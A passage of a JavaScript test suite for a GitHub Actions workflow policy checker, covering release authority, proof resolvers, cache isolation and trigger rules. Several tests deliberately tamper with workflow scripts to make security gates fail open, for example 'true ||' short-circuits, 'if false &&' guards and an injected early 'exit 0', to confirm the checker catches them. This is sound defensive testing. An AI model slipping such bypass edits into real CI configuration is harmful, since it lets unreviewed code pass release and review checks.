import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { chmodSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";
import {
  basicWorkflowViolations,
  draftSourcePolicyViolations,
  draftWorkflowPolicyViolations,
  loadWorkflows,
  macosCliDistributionViolations,
  notaryStepViolations,
  packagedPrSigningViolations,
  parseWorkflow,
  releaseEvidenceApprovalViolations,
  releaseEvidenceWorkflowRef,
  releaseWorkflowContractViolations,
  retrievalFile,
  retrievalProducerTriggerPolicyViolations,
  validateCargoTestFilters,
  validateWorkflows,
  windowsManifestProofPolicyViolations,
} from "./check-workflow-policy.mjs";
import { loadReleaseClaimGraph } from "../../scripts/codestory-release-claims.mjs";

const fullSha = "0123456789abcdef0123456789abcdef01234567";
const proofTopology = "proof5-v1-64015a841a2f69f33f7c9ce284f671ad27b3923a58db865fd4806d86230df6c5";
const cacheManifestIdentity = "${{ hashFiles('Cargo.toml', 'crates/**/Cargo.toml', 'vendor/**/Cargo.toml') }}";
const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");

function draftSourceJob() {
  return structuredClone(loadWorkflows().get("rust-ci.yml").jobs["linux-draft"]);
}

function draftSourceWorkflow() {
  return structuredClone(loadWorkflows().get("rust-ci.yml"));
}

function retrievalSourceJob() {
  return structuredClone(loadWorkflows().get(retrievalFile).jobs["linux-contracts"]);
}

function retrievalSourceWorkflow() {
  return structuredClone(loadWorkflows().get(retrievalFile));
}

function windowsManifestWorkflow() {
  return retrievalSourceWorkflow();
}

function draftStep(job, name) {
  const matches = job.steps.filter(step => step.name === name);
  assert.equal(matches.length, 1, `expected one ${name} step`);
  return matches[0];
}

function moveNamedStepAfter(job, movedName, afterName) {
  const movedIndex = job.steps.findIndex(step => step.name === movedName);
  assert.notEqual(movedIndex, -1, `missing ${movedName}`);
  const [moved] = job.steps.splice(movedIndex, 1);
  const afterIndex = job.steps.findIndex(step => step.name === afterName);
  assert.notEqual(afterIndex, -1, `missing ${afterName}`);
  job.steps.splice(afterIndex + 1, 0, moved);
}

function runResolver(file, jobName, environment) {
  const workflow = loadWorkflows().get(file);
  const run = draftStep(workflow.jobs[jobName], "Resolve trusted exact head").run;
  const directory = mkdtempSync(path.join(os.tmpdir(), "codestory-proof-resolver-"));
  const fakeGh = path.join(directory, "gh");
  const baseSha = "1".repeat(40);
  writeFileSync(fakeGh, `#!/bin/sh
case "$*" in
  *"branches/dev/codestory-next"*) printf '%s\\n' '${fullSha}' ;;
  *) printf '%s\\n' '${JSON.stringify({
    head: {
      repo: { full_name: "TheGreenCedar/CodeStory" },
      sha: fullSha,
      ref: "codex/exact-head",
    },
    base: { sha: baseSha, ref: "dev/codestory-next" },
    labels: [{ name: "review-accepted" }],
  })}' ;;
esac
`);
  chmodSync(fakeGh, 0o755);
  const output = path.join(directory, "github-output");
  writeFileSync(output, "");
  return spawnSync("bash", ["-c", run], {
    encoding: "utf8",
    env: {
      ...process.env,
      PATH: `${directory}:${process.env.PATH}`,
      GH_TOKEN: "test-token",
      GITHUB_REPOSITORY: "TheGreenCedar/CodeStory",
      GITHUB_OUTPUT: output,
      ...environment,
    },
  });
}

function runReleaseAuthority(environment, liveSha = fullSha) {
  const workflow = loadWorkflows().get("release.yml");
  const run = draftStep(workflow.jobs.preflight, "Validate release authority").run;
  const quote = value => `'${String(value).replaceAll("'", `'"'"'`)}'`;
  const exports = Object.entries({
    GH_TOKEN: "test-token",
    GITHUB_REPOSITORY: "TheGreenCedar/CodeStory",
    ...environment,
  })
    .map(([key, value]) => `export ${key}=${quote(value)}`)
    .join("\n");
  const command = `gh() { printf '%s\\n' ${quote(liveSha)}; }
${exports}
${run}`;
  const executable = process.platform === "win32" ? "wsl.exe" : "bash";
  const args = process.platform === "win32"
    ? ["--exec", "/bin/bash", "-c", command]
    : ["-c", command];
  return spawnSync(executable, args, {
    encoding: "utf8",
  });
}

function windowsManifestJob(workflow) {
  return workflow.jobs["windows-manifest-missing"];
}

function windowsManifestStep(workflow, name) {
  return draftStep(windowsManifestJob(workflow), name);
}

function releaseEvidenceApprovalBoundary() {
  return {
    callers: [
      ["release.yml", {
        uses: releaseEvidenceWorkflowRef,
        with: { source_run_id: "${{ inputs.source_run_id }}" },
        secrets: {
          CODESTORY_RELEASE_EVIDENCE_APPROVAL_JSON:
            "${{ secrets.CODESTORY_RELEASE_EVIDENCE_APPROVAL_JSON }}",
        },
      }, true],
      ["packaged-platform-pr.yml", {
        uses: releaseEvidenceWorkflowRef,
        with: { source_run_id: "${{ inputs.source_run_id }}" },
      }, false],
    ],
    called: {
      on: {
        workflow_call: {
          secrets: {
            CODESTORY_RELEASE_EVIDENCE_APPROVAL_JSON: { required: false },
          },
        },
      },
      jobs: {
        measure: {
          environment: "release-evidence",
          steps: [
            {
              name: "Produce and evaluate same-SHA candidate",
              env: {
                APPROVAL_JSON: "${{ secrets.CODESTORY_RELEASE_EVIDENCE_APPROVAL_JSON }}",
              },
              run: [
                'if [ -n "$SOURCE_RUN_ID" ] && [ -z "$APPROVAL_JSON" ]; then',
                '  echo "::error::Protected release-evidence approval is required for source-run re-evaluation."',
                "  exit 1",
                "fi",
              ].join("\n"),
            },
          ],
        },
      },
    },
  };
}

test("parser ignores YAML comments and harmless formatting", () => {
  const block = parseWorkflow(`
on:
  pull_request:
permissions:
  contents: read
jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: vendor/action@${fullSha}
# uses: vendor/action@main
`);
  const flow = parseWorkflow(`
"on": { pull_request: null }
permissions: { contents: read }
jobs: { check: { runs-on: ubuntu-latest, steps: [ { uses: vendor/action@${fullSha} } ] } }
`);
  assert.deepEqual(block, flow);
});

test("release evidence policy pins the release-only Axios v2 task and corpus", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  const file = "release-candidate-evidence.yml";
  const mutations = [
    ["repo corpus drifts", workflow => {
      draftStep(workflow.jobs.measure, "Produce full-retrieval repo evidence")
        .env.CODESTORY_RELEASE_EVIDENCE_CORPUS_ID = "codestory-release-corpus-v0.16-axios-js-ts-v1";
    }, /repo evidence must bind the v0\.16 Axios v2 corpus/u],
    ["packet corpus contract drifts", workflow => {
      draftStep(workflow.jobs.measure, "Produce publishable packet evidence")
        .env.CODESTORY_RELEASE_EVIDENCE_CORPUS_CONTRACT
          = "benchmarks/release-evidence/corpus-contracts/v0.16-axios-js-ts-v1.json";
    }, /packet evidence must bind the v0\.16 Axios v2 corpus contract/u],
    ["packet task falls back to the holdout suite", workflow => {
      const step = draftStep(workflow.jobs.measure, "Produce publishable packet evidence");
      step.run = step.run.replace(
        /--task-manifest [^\\\n]+/u,
        "--task-suite holdout-retrieval --task-ids axios-request-dispatch",
      );
    }, /must select only the corpus-bound release task manifest/u],
  ];
  for (const [name, mutate, expected] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      assert.match(validateWorkflows(workflows).join("\n"), expected);
    });
  }
});

test("release workflows retain the closeout coordinator contract test", () => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  for (const [file, jobName] of [
    ["plugin-static.yml", "plugin-static"],
    ["release.yml", "workflow-policy"],
  ]) {
    const workflows = loadWorkflows();
    const step = workflows.get(file).jobs[jobName].steps.find(
      ({ name }) => name === "Check release claim and evidence contracts",
    );
    step.run = step.run.replace("scripts/tests/codestory-release-closeout.test.mjs", "");
    assert.ok(
      validateWorkflows(workflows).some((message) =>
        message.includes(file)
          && message.includes("scripts/tests/codestory-release-closeout.test.mjs")),
    );
  }
});

test("workflow hygiene requires declared permissions and step-job timeouts", () => {
  const valid = parseWorkflow(`
on: { workflow_dispatch: null }
permissions: { contents: read }
jobs:
  work:
    timeout-minutes: 5
    steps:
      - run: echo ok
  call:
    uses: ./.github/workflows/other.yml
`);
  assert.deepEqual(basicWorkflowViolations("fixture.yml", valid), []);

  const withoutPermissions = structuredClone(valid);
  delete withoutPermissions.permissions;
  assert.match(
    basicWorkflowViolations("fixture.yml", withoutPermissions).join("\n"),
    /must declare a top-level permissions block/u,
  );

  const withoutTimeout = structuredClone(valid);
  delete withoutTimeout.jobs.work["timeout-minutes"];
  assert.match(
    basicWorkflowViolations("fixture.yml", withoutTimeout).join("\n"),
    /jobs\.work must declare timeout-minutes/u,
  );
});

test("cargo test filters must select at least one real test", () => {
  const identifiers = new Map([["demo-crate", "/unused"]]);
  const known = new Set(["tests", "demo_tests", "full_publication_survives_restart"]);
  const originalReaddir = known;
  const workflows = new Map([
    [
      "fixture.yml",
      parseWorkflow(`
on: { workflow_dispatch: null }
permissions: { contents: read }
jobs:
  proof:
    timeout-minutes: 5
    steps:
      - run: |
          cargo test --locked -p demo-crate --lib publication_survives
          cargo test --locked -p demo-crate --lib -- --exact tests::demo_tests::full_publication_survives_restart
          cargo test --locked -p demo-crate --target \${{ matrix.rust_target }} --lib tests
          cargo test --locked -p demo-crate --lib publication_survives -- --test-threads 1
`),
    ],
  ]);
  // Substring semantics: `publication_survives` legitimately selects the `full_…_restart` test.
  const violations = [];
  validateCargoTestFilters(workflows, violations, identifiers, () => originalReaddir);
  assert.deepEqual(violations, []);

  const renamed = new Set(["tests", "demo_tests", "renamed_publication_check"]);
  const afterRename = [];
  validateCargoTestFilters(workflows, afterRename, identifiers, () => renamed);
  assert.match(afterRename.join("\n"), /selects no test: publication_survives/u);
  assert.match(afterRename.join("\n"), /selects no test: full_publication_survives_restart/u);
});

test("third-party action policy reads only parsed uses values", () => {
  const valid = parseWorkflow(`
on: { workflow_dispatch: null }
permissions: { contents: read }
jobs:
  check:
    timeout-minutes: 5
    steps:
      - uses: vendor/action@${fullSha}
# uses: vendor/action@main
`);
  assert.deepEqual(basicWorkflowViolations("fixture.yml", valid), []);

  const invalid = structuredClone(valid);
  invalid.jobs.check.steps[0].uses = "vendor/action@main";
  assert.match(basicWorkflowViolations("fixture.yml", invalid).join("\n"), /full-length SHA/u);
});

test("release authority accepts only exact live auto-main or manual-dev routes", async (t) => {
  const auto = {
    EXPECTED_HEAD_SHA: "",
    GITHUB_EVENT_NAME: "push",
    GITHUB_REF: "refs/heads/main",
    GITHUB_SHA: fullSha,
    GITHUB_WORKFLOW_REF: "TheGreenCedar/CodeStory/.github/workflows/auto-release.yml@refs/heads/main",
    PUBLISH_RELEASE: "true",
  };
  const manual = {
    EXPECTED_HEAD_SHA: fullSha,
    GITHUB_EVENT_NAME: "workflow_dispatch",
    GITHUB_REF: "refs/heads/dev/codestory-next",
    GITHUB_SHA: fullSha,
    GITHUB_WORKFLOW_REF: "TheGreenCedar/CodeStory/.github/workflows/release.yml@refs/heads/dev/codestory-next",
    PUBLISH_RELEASE: "",
  };

  await t.test("trusted auto push on live main", () => {
    const result = runReleaseAuthority(auto);
    assert.equal(result.status, 0, result.stderr || result.stdout);
  });
  await t.test("manual proof on exact live dev", () => {
    const result = runReleaseAuthority(manual);
    assert.equal(result.status, 0, result.stderr || result.stdout);
  });
  await t.test("manual event cannot claim publication", () => {
    const result = runReleaseAuthority({ ...manual, PUBLISH_RELEASE: "true" });
    assert.notEqual(result.status, 0);
    assert.match(result.stdout, /Publication authority requires the trusted reusable-workflow caller/u);
  });
  await t.test("wrong automatic caller is rejected", () => {
    const result = runReleaseAuthority({
      ...auto,
      GITHUB_WORKFLOW_REF: "TheGreenCedar/CodeStory/.github/workflows/rogue.yml@refs/heads/main",
    });
    assert.notEqual(result.status, 0);
  });
  await t.test("stale main is rejected", () => {
    const result = runReleaseAuthority(auto, "2".repeat(40));
    assert.notEqual(result.status, 0);
    assert.match(result.stdout, /main moved from release head/u);
  });
  await t.test("wrong manual SHA is rejected", () => {
    const result = runReleaseAuthority({ ...manual, EXPECTED_HEAD_SHA: "2".repeat(40) });
    assert.notEqual(result.status, 0);
    assert.match(result.stdout, /does not match workflow head/u);
  });
  await t.test("stale dev is rejected", () => {
    const result = runReleaseAuthority(manual, "2".repeat(40));
    assert.notEqual(result.status, 0);
    assert.match(result.stdout, /dev\/codestory-next moved from proved head/u);
  });
});

test("proof resolvers reject hostile refs, SHAs, and labeled-event drift before proof work", async (t) => {
  const otherSha = "2".repeat(40);
  const sourceEnvironment = {
    PR_NUMBER: "1230",
    EXPECTED_HEAD_SHA: fullSha,
    CALLER_REF: "",
    EVENT_PR_NUMBER: "",
    EVENT_HEAD_SHA: "",
    EVENT_HEAD_REPO: "",
    GITHUB_EVENT_NAME: "workflow_dispatch",
    GITHUB_SHA: fullSha,
  };
  await t.test("source PR dispatch", () => {
    const rejected = runResolver("source-proof.yml", "resolve", {
      ...sourceEnvironment,
      GITHUB_REF: "refs/heads/main",
    });
    assert.notEqual(rejected.status, 0);
    assert.match(rejected.stdout, /--ref codex\/exact-head/u);

    const wrongSha = runResolver("source-proof.yml", "resolve", {
      ...sourceEnvironment,
      GITHUB_REF: "refs/heads/codex/exact-head",
      GITHUB_SHA: otherSha,
    });
    assert.notEqual(wrongSha.status, 0);
    assert.match(wrongSha.stdout, /Workflow SHA .* is not reviewed PR head/u);

    const accepted = runResolver("source-proof.yml", "resolve", {
      ...sourceEnvironment,
      GITHUB_REF: "refs/heads/codex/exact-head",
    });
    assert.equal(accepted.status, 0, accepted.stderr || accepted.stdout);
  });

  await t.test("source labeled event", () => {
    const environment = {
      PR_NUMBER: "",
      EXPECTED_HEAD_SHA: "",
      CALLER_REF: "",
      EVENT_PR_NUMBER: "1230",
      EVENT_HEAD_SHA: fullSha,
      EVENT_HEAD_REPO: "TheGreenCedar/CodeStory",
      GITHUB_EVENT_NAME: "pull_request",
      GITHUB_REF: "refs/pull/1230/merge",
      GITHUB_SHA: fullSha,
    };
    const accepted = runResolver("source-proof.yml", "resolve", environment);
    assert.equal(accepted.status, 0, accepted.stderr || accepted.stdout);

    const drifted = runResolver("source-proof.yml", "resolve", {
      ...environment,
      EVENT_HEAD_SHA: otherSha,
    });
    assert.notEqual(drifted.status, 0);
    assert.match(drifted.stdout, /moved after the review-accepted label event/u);
  });

  const packagedEnvironment = {
    INPUT_PR_NUMBER: "1230",
    INPUT_HEAD_SHA: fullSha,
    INPUT_MODE: "platform",
    EVENT_PR_NUMBER: "",
    EVENT_HEAD_SHA: "",
    EVENT_HEAD_REPO: "",
    INPUT_SOURCE_RUN_ID: "",
    INPUT_CALIBRATION_ARTIFACT: "",
    INPUT_CALIBRATION_RUN_ID: "",
    GITHUB_EVENT_NAME: "workflow_dispatch",
    GITHUB_SHA: fullSha,
  };
  await t.test("platform PR dispatch", () => {
    const rejected = runResolver("packaged-platform-pr.yml", "route", {
      ...packagedEnvironment,
      GITHUB_REF: "refs/heads/main",
    });
    assert.notEqual(rejected.status, 0);
    assert.match(rejected.stdout, /--ref codex\/exact-head/u);

    const wrongSha = runResolver("packaged-platform-pr.yml", "route", {
      ...packagedEnvironment,
      GITHUB_REF: "refs/heads/codex/exact-head",
      GITHUB_SHA: otherSha,
    });
    assert.notEqual(wrongSha.status, 0);
    assert.match(wrongSha.stdout, /Workflow SHA .* is not accepted PR head/u);

    const accepted = runResolver("packaged-platform-pr.yml", "route", {
      ...packagedEnvironment,
      GITHUB_REF: "refs/heads/codex/exact-head",
    });
    assert.equal(accepted.status, 0, accepted.stderr || accepted.stdout);
  });

  await t.test("platform labeled event", () => {
    const environment = {
      ...packagedEnvironment,
      INPUT_PR_NUMBER: "",
      INPUT_HEAD_SHA: "",
      INPUT_MODE: "",
      EVENT_PR_NUMBER: "1230",
      EVENT_HEAD_SHA: fullSha,
      EVENT_HEAD_REPO: "TheGreenCedar/CodeStory",
      GITHUB_EVENT_NAME: "pull_request",
      GITHUB_REF: "refs/pull/1230/merge",
    };
    const accepted = runResolver("packaged-platform-pr.yml", "route", environment);
    assert.equal(accepted.status, 0, accepted.stderr || accepted.stdout);

    const drifted = runResolver("packaged-platform-pr.yml", "route", {
      ...environment,
      EVENT_HEAD_SHA: otherSha,
    });
    assert.notEqual(drifted.status, 0);
    assert.match(drifted.stdout, /moved after the platform-proof label event/u);
  });

  await t.test("integration dispatch", () => {
    const rejected = runResolver("packaged-platform-pr.yml", "route", {
      ...packagedEnvironment,
      INPUT_PR_NUMBER: "",
      INPUT_MODE: "integration",
      GITHUB_REF: "refs/heads/main",
    });
    assert.notEqual(rejected.status, 0);
    assert.match(rejected.stdout, /--ref dev\/codestory-next/u);

    const accepted = runResolver("packaged-platform-pr.yml", "route", {
      ...packagedEnvironment,
      INPUT_PR_NUMBER: "",
      INPUT_MODE: "integration",
      GITHUB_REF: "refs/heads/dev/codestory-next",
    });
    assert.equal(accepted.status, 0, accepted.stderr || accepted.stdout);
  });
});

test("exact proof policy rejects trigger and identity downgrades", async (t) => {
  const sourceFile = "source-proof.yml";
  const packagedCoordinatorFile = "packaged-platform-pr.yml";
  const packagedProofFile = "packaged-platform-proof.yml";
  const linuxVulkanFile = "linux-vulkan-proof.yml";
  const windowsVulkanFile = "windows-vulkan-proof.yml";
  const metalProofFile = "macos-metal-proof.yml";
  const sourceResolver = workflow => draftStep(workflow.jobs.resolve, "Resolve trusted exact head");
  const packagedResolver = workflow => draftStep(workflow.jobs.route, "Resolve trusted exact head");

  const mutations = [
    ["source synchronize trigger", sourceFile, workflow => {
      workflow.on.pull_request.types.push("synchronize");
    }, /trigger must be label-only/u],
    ["platform synchronize trigger", packagedCoordinatorFile, workflow => {
      workflow.on.pull_request.types.push("synchronize");
    }, /trigger must be label-only/u],
    ["source PR-number-only concurrency", sourceFile, workflow => {
      workflow.concurrency.group = "source-proof-${{ inputs.pr_number || github.event.pull_request.number }}";
    }, /concurrency must bind the Actions SHA/u],
    ["platform PR-number-only concurrency", packagedCoordinatorFile, workflow => {
      workflow.concurrency.group = "proof-${{ inputs.mode }}-${{ inputs.pr_number }}";
    }, /concurrency must bind the Actions SHA/u],
    ["source manual SHA equality", sourceFile, workflow => {
      sourceResolver(workflow).run = sourceResolver(workflow).run
        .replace('test "$GITHUB_SHA" = "$EXPECTED_HEAD_SHA"', 'test -n "$GITHUB_SHA"');
    }, /GITHUB_SHA.*EXPECTED_HEAD_SHA/u],
    ["source manual SHA short-circuit", sourceFile, workflow => {
      sourceResolver(workflow).run = sourceResolver(workflow).run
        .replace(
          'test "$GITHUB_SHA" = "$EXPECTED_HEAD_SHA" || {',
          'true || test "$GITHUB_SHA" = "$EXPECTED_HEAD_SHA" || {',
        );
    }, /exact normalized trusted resolver script contract/u],
    ["source labeled branch disabled", sourceFile, workflow => {
      sourceResolver(workflow).run = sourceResolver(workflow).run
        .replace(
          'if [ -n "$EVENT_PR_NUMBER" ]; then',
          'if false && [ -n "$EVENT_PR_NUMBER" ]; then',
        );
    }, /exact normalized trusted resolver script contract/u],
    ["source resolver exits before trusted checks", sourceFile, workflow => {
      sourceResolver(workflow).run = sourceResolver(workflow).run
        .replace(
          "set -euo pipefail",
          'set -euo pipefail\necho "ref=$GITHUB_SHA" >> "$GITHUB_OUTPUT"\nexit 0',
        );
    }, /exact normalized trusted resolver script contract/u],
    ["source resolver blank line", sourceFile, workflow => {
      sourceResolver(workflow).run = sourceResolver(workflow).run
        .replace("set -euo pipefail\n", "set -euo pipefail\n\n");
    }, /exact normalized trusted resolver script contract/u],
    ["source labeled job disabled", sourceFile, workflow => {
      workflow.jobs.resolve.if
        = "false && (github.event.action == 'labeled' && github.event.label.name == 'review-accepted')";
    }, /only review-accepted labeled PR runs/u],
    ["source manual ref equality", sourceFile, workflow => {
      sourceResolver(workflow).run = sourceResolver(workflow).run
        .replace('test "$GITHUB_REF" = "refs\/heads\/$head_ref"', 'test -n "$GITHUB_REF"');
    }, /GITHUB_REF.*head_ref/u],
    ["platform manual SHA equality", packagedCoordinatorFile, workflow => {
      packagedResolver(workflow).run = packagedResolver(workflow).run
        .replace('test "$GITHUB_SHA" = "$INPUT_HEAD_SHA"', 'test -n "$GITHUB_SHA"');
    }, /GITHUB_SHA.*INPUT_HEAD_SHA/u],
    ["platform manual SHA short-circuit", packagedCoordinatorFile, workflow => {
      packagedResolver(workflow).run = packagedResolver(workflow).run
        .replace(
          'test "$GITHUB_SHA" = "$INPUT_HEAD_SHA" || {',
          'true || test "$GITHUB_SHA" = "$INPUT_HEAD_SHA" || {',
        );
    }, /exact normalized trusted resolver script contract/u],
    ["platform labeled branch disabled", packagedCoordinatorFile, workflow => {
      packagedResolver(workflow).run = packagedResolver(workflow).run
        .replace(
          'if [ -n "$EVENT_HEAD_REPO" ]; then',
          'if false && [ -n "$EVENT_HEAD_REPO" ]; then',
        );
    }, /exact normalized trusted resolver script contract/u],
    ["platform resolver exits before trusted checks", packagedCoordinatorFile, workflow => {
      packagedResolver(workflow).run = packagedResolver(workflow).run
        .replace(
          "set -euo pipefail",
          'set -euo pipefail\necho "head_sha=$GITHUB_SHA" >> "$GITHUB_OUTPUT"\nexit 0',
        );
    }, /exact normalized trusted resolver script contract/u],
    ["platform resolver backslash continuation blank line", packagedCoordinatorFile, workflow => {
      packagedResolver(workflow).run = packagedResolver(workflow).run
        .replace(
          'if [ -n "$INPUT_SOURCE_RUN_ID" ] \\\n    ||',
          'if [ -n "$INPUT_SOURCE_RUN_ID" ] \\\n\n    ||',
        );
    }, /exact normalized trusted resolver script contract/u],
    ["platform labeled job disabled", packagedCoordinatorFile, workflow => {
      workflow.jobs.route.if
        = "false && (github.event.action == 'labeled' && github.event.label.name == 'platform-proof')";
    }, /only platform-proof labeled PR runs/u],
    ["integration live dev SHA equality", packagedCoordinatorFile, workflow => {
      packagedResolver(workflow).run = packagedResolver(workflow).run
        .replace('test "$GITHUB_SHA" = "$dev_head"', 'test -n "$GITHUB_SHA"');
    }, /GITHUB_SHA.*dev_head/u],
    ["hosted-only integration scope removed", packagedCoordinatorFile, workflow => {
      workflow.on.workflow_dispatch.inputs.scope.options
        = workflow.on.workflow_dispatch.inputs.scope.options.filter(scope => scope !== "none");
    }, /dispatch scopes changed/u],
    ["exact integration Linux scope removed", packagedCoordinatorFile, workflow => {
      const step = draftStep(workflow.jobs.route, "Select change-aware proof scope");
      step.run = step.run.replace(' || [ "$REQUESTED_SCOPE" = linux ]', "");
    }, /integration must preserve explicit no-op and Linux scopes/u],
    ["release evidence runs implicitly", packagedCoordinatorFile, workflow => {
      workflow.jobs["release-evidence"].if = "needs.route.outputs.mode != 'calibration'";
    }, /optional release evidence must run only in explicit release-evidence mode/u],
    ["package waits for release evidence", packagedCoordinatorFile, workflow => {
      workflow.jobs["packaged-proof"].needs.push("release-evidence");
    }, /package proof must not depend on optional release evidence/u],
    ["protected Linux proof removed", packagedCoordinatorFile, workflow => {
      workflow.jobs["linux-vulkan-proof"].uses = "./.github/workflows/packaged-platform-proof.yml";
    }, /Linux proof must use the protected Vulkan workflow/u],
    ["protected Linux candidate proof disabled", packagedCoordinatorFile, workflow => {
      workflow.jobs["linux-vulkan-proof"].with.candidate_installed_proof = false;
    }, /Linux proof must close Vulkan and candidate-installed claims/u],
    ["manual Linux candidate trusts a non-producer", linuxVulkanFile, workflow => {
      workflow.on.workflow_dispatch.inputs.candidate_producer_workflow_path.default
        = ".github/workflows/release.yml";
    }, /manual candidate proof must trust the package-producing workflow/u],
    ["closeout skips protected Linux", packagedCoordinatorFile, workflow => {
      workflow.jobs.closeout.needs = workflow.jobs.closeout.needs
        .filter(name => name !== "linux-vulkan-proof");
    }, /closeout must wait for every selected platform proof/u],
    ["closeout waits for release evidence", packagedCoordinatorFile, workflow => {
      workflow.jobs.closeout.needs.push("release-evidence");
    }, /normal closeout must not depend on optional release evidence/u],
    ["Linux package matrix scope removed", packagedProofFile, workflow => {
      workflow.jobs.build.strategy.matrix
        = workflow.jobs.build.strategy.matrix.replace("inputs.scope == 'linux'", "inputs.scope == 'windows'");
    }, /matrix must select structural JSON by scope/u],
    ["package evaluation driver reaches the standard path", packagedProofFile, workflow => {
      draftStep(workflow.jobs.build, "Build qualification driver").if
        = "matrix.asset_target == 'linux-x64'";
    }, /packaged-platform-proof\.yml/u],
    ["package evaluation reaches the standard path", packagedProofFile, workflow => {
      const step = draftStep(
        workflow.jobs.build,
        "Packaged per-user server calibration or qualification",
      );
      step.if = "matrix.asset_target == 'linux-x64'";
    }, /packaged-platform-proof\.yml/u],
    ["package evaluation downloads calibration on the standard path", packagedProofFile, workflow => {
      draftStep(workflow.jobs.build, "Authenticate calibration bundle producer").if
        = "matrix.asset_target == 'linux-x64'";
      draftStep(workflow.jobs.build, "Download frozen calibration bundle").if
        = "matrix.asset_target == 'linux-x64'";
    }, /packaged-platform-proof\.yml/u],
    ["package evaluation artifact upload reaches the standard path", packagedProofFile, workflow => {
      draftStep(workflow.jobs.build, "Upload packaged agent proof artifacts").if
        = "always() && matrix.asset_target == 'linux-x64'";
    }, /packaged-platform-proof\.yml/u],
    ["package calibration artifact escapes into quality evaluation", packagedProofFile, workflow => {
      draftStep(workflow.jobs.build, "Upload hosted Linux calibration runs").if
        = "success() && matrix.asset_target == 'linux-x64'";
    }, /hosted calibration artifact must remain calibration-only/u],
    ["package calibration failure evidence removed", packagedProofFile, workflow => {
      workflow.jobs.build.steps = workflow.jobs.build.steps
        .filter(({ name }) => name !== "Upload hosted Linux calibration failure evidence");
    }, /hosted calibration failure evidence must stay a failure-only best-effort upload/u],
    ["package calibration failure evidence becomes success-gated", packagedProofFile, workflow => {
      draftStep(workflow.jobs.build, "Upload hosted Linux calibration failure evidence").if
        = "success() && matrix.asset_target == 'linux-x64' && inputs.calibration_mode";
    }, /hosted calibration failure evidence must stay a failure-only best-effort upload/u],
    ["package calibration failure evidence fails closed", packagedProofFile, workflow => {
      draftStep(workflow.jobs.build, "Upload hosted Linux calibration failure evidence")
        .with["if-no-files-found"] = "error";
    }, /hosted calibration failure evidence must stay a failure-only best-effort upload/u],
    ["package evaluation becomes a standard server-behavior proof", packagedProofFile, workflow => {
      draftStep(
        workflow.jobs.build,
        "Packaged per-user server calibration or qualification",
      ).run += "\n--server-behavior-only";
    }, /optional hosted CPU lane must remain evaluation-only/u],
    ["package workflow reclaims candidate-installed proof", packagedProofFile, workflow => {
      workflow.on.workflow_call.inputs.candidate_installed_proof = {
        required: false,
        default: false,
        type: "boolean",
      };
    }, /package-only workflow must not define candidate_installed_proof/u],
    ["package evaluation reads the calibration contract from an unpinned location", packagedProofFile, workflow => {
      const step = draftStep(
        workflow.jobs.build,
        "Packaged per-user server calibration or qualification",
      );
      step.run = step.run.replaceAll(
        "crates/codestory-llama-sys/per-user-embedding-server-constant-set.json",
        "per-user-embedding-server-constant-set.json",
      );
    }, /must run test "\$\(jq -r \.status crates\/codestory-llama-sys\/per-user-embedding-server-constant-set\.json\)"/u],
    ["Metal calibration reads the calibration contract from an unpinned location", metalProofFile, workflow => {
      const step = draftStep(
        workflow.jobs["packaged-metal"],
        "Collect three independent Metal calibration runs",
      );
      step.run = step.run.replaceAll(
        "crates/codestory-llama-sys/per-user-embedding-server-constant-set.json",
        "per-user-embedding-server-constant-set.json",
      );
    }, /Collect three independent Metal calibration runs must run test "\$\(jq -r \.status crates\/codestory-llama-sys\/per-user-embedding-server-constant-set\.json\)"/u],
    ["Vulkan model preparation drops the bypass shell", windowsVulkanFile, workflow => {
      delete draftStep(workflow.jobs["packaged-vulkan"], "Prepare checksum-pinned embedded model").shell;
    }, /Prepare checksum-pinned embedded model must declare the bypass shell/u],
  ];

  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  for (const [name, file, mutate, expectedReason] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      assert.match(validateWorkflows(workflows).join("\n"), expectedReason);
    });
  }
});

test("reusable compiler caches and proof modes reject hostile downgrades", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);

  const sourceFile = "source-proof.yml";
  const packagedFile = "packaged-platform-proof.yml";
  const coordinatorFile = "packaged-platform-pr.yml";
  const releaseFile = "release.yml";
  const sourceJob = workflow => workflow.jobs["full-source-gate"];
  const packagedJob = workflow => workflow.jobs.build;
  const sourceIdentity = workflow =>
    draftStep(sourceJob(workflow), "Capture reusable build cache contract");
  const packagedIdentity = workflow =>
    draftStep(packagedJob(workflow), "Capture reusable build cache contract");

  const mutations = [
    ["release workflow policy loses its full history", releaseFile, workflow => {
      delete workflow.jobs["workflow-policy"].steps[0].with;
    }, /workflow-policy must check out full history for the reuse-binding contracts/u],
    ["marketplace preflight proves the live revision against a fixture", releaseFile, workflow => {
      const step = draftStep(workflow.jobs["preflight"], "Prove the public marketplace install path");
      step.run = step.run.replace('--marketplace-revision "$fixture_revision"', '--marketplace-revision "$marketplace_revision"');
    }, /--marketplace-revision "\$fixture_revision"/u],
    ["source compiler restore becomes exact-SHA-only", sourceFile, workflow => {
      draftStep(sourceJob(workflow), "Restore compatible compiler objects")
        .with["restore-keys"] = "${{ steps.build-cache.outputs.compiler-key }}";
    }, /source-proof\.yml compiler cache must restore the newest compatible prior candidate/u],
    ["packaged compiler restore becomes exact-SHA-only", packagedFile, workflow => {
      draftStep(packagedJob(workflow), "Restore compatible compiler objects")
        .with["restore-keys"] = "${{ steps.build-cache.outputs.compiler-key }}";
    }, /packaged-platform-proof\.yml compiler cache must restore the newest compatible prior candidate/u],
    ["packaged dependency restore accepts stale inputs", packagedFile, workflow => {
      draftStep(packagedJob(workflow), "Restore Cargo dependency inputs")
        .with["restore-keys"] = "codestory-release-dependencies-";
    }, /dependency cache must be exact-input-only and exclude compiler output/u],
    ["source dependency cache escapes isolation", sourceFile, workflow => {
      draftStep(sourceJob(workflow), "Restore Cargo dependency inputs")
        .with.path = "~/.cargo/registry\n~/.cargo/git";
    }, /dependency cache must be exact-input-only and exclude compiler output/u],
